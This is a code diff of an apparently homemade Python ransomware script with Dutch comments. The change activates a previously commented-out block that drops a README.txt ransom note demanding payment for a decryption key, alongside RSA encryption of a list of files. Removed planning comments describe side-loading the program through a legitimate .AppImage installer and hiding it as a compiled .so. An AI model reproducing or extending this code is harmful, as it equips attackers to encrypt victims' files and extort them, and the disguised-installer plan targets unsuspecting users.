@@ -1,4 +1,3 @@
-import glob
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
 import base64
@@ -44,28 +43,11 @@ for file in bestandenlijst:
 #Hier decrypt functie
 #RSA_key_decrypt = RSA.import_key("decrypt_key.key")
 
-
-
-
-
-
-
-
-'''
 #Readme aanmaken.
 Readme = open("README.txt","w")
 Readme.write("Hallo! Je hebt encryptiesoftware geactiveerd!\n Om je bestanden tedecrypten moet je geld overmaken naar XXX.\n Dan zal je de decryptkey ontvangen!")
 Readme.close()
-'''
+
 
 #Endstage
 print("Code 200!")
-
-# Scan Dirs voor locatie (Waar ben ik?)
-# Doe een glob.glob() scan voor de beschikbare bestanden (recursive)
-# Side-loaden via orginele .AppImage installer.
-# MAC als salt + harcoded key. <-- Nope, PubKey gedaan. (Done)
-# README tegen het einde. (Done)
-# Linux based, .py to .so en intergraten in een .AppImage ofzo?
-# RSA 2096-bit (Done) of toch ECC 256-bit of 512-bit ? (Waarom of gewoon leuk?)
-# Hoe de Priv key ontvangen? - Staat in Github :) (API key?, en pullen?)
